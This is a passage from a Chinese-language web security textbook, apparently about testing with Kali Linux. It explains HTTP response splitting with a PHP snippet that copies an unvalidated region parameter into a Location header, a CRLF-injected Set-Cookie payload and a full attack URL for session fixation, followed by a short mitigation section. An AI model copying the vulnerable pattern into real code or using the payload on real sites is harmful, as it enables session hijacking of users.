  Header("Location: http://fakewebsite.com/regions.php?region=".$_GET['region'] );
  /* This code will set the location field in the header . */
  Exit;
?>
```

如果用户选择`region`为`India`，则响应头中的`Location`字段将设置为`http://fakewebsite.com/regions.php?region=India`，如下图所示：

![HTTP response splitting](../Images/image01133.jpeg)

可以看到，region 参数直接嵌入到响应头的`Location`字段中。不执行输入验证的易受攻击 web 应用程序也会接受其他值。我们可以发送一些元字符，例如回车符（`\r`）和换行符（`\n`），以及一些附加输入，以终止`Location`字段中的值，并在 HTTP 标头中创建附加字段，而不是发送值 India。

`\r`和`\n`是用来表示新行的两个元字符。使用新行字符，攻击者可以在浏览器中插入新的标题字段。您可以使用以下内容设置 HTTP 头中的`Cookie`字段，并执行会话固定攻击：

```
\r\nSet-Cookie:PHPSESSID=edqvg3nt390ujqr906730ru1p5
```

这里需要注意的一点是，您需要对特殊字符进行 URL 编码，编码值如下所示：

```
%0d%0aSet-Cookie%3APHPSESSID%3Dedqvg3nt390ujqr906730ru1p5
```

发送到 web 应用程序的最终请求（而不是所选区域的值）将如以下链接所示，并且当服务器发送响应标头时，将为受害者设置一个新的 cookie：

```
http://fakewebsite.com/regions.php?region=%0d%0aSet-Cookie%3APHPSESSID%3Dedqvg3nt390ujqr906730ru1p5
```

## 缓解措施

正确的输入验证和对从用户处收到的数据进行消毒是缓解的关键。在 HTTP 响应头中放置值之前，应删除 CR 和 CL 等元字符。

# 总结

我们必须在各个层面上处理 web 应用程序中的缺陷。一些缺陷是由于默认配置造成的，但大多数缺陷的存在是因为在开发应用程序时没有考虑安全风险。安全软件开发生命周期是在开发的每个阶段（即从需求收集到产品最终发布）考虑应用程序安全方面因素的前进方向。正如本章所讨论的，正确的输入验证是缓解大多数攻击的关键，攻击者将始终保持警觉，试图绕过缓解。在应用程序开发的每个阶段增加安全性将降低所生产软件的总体风险。

在下一章中，我们将研究注入缺陷以及使用 Kali Linux 中的工具利用这些缺陷的不同方法。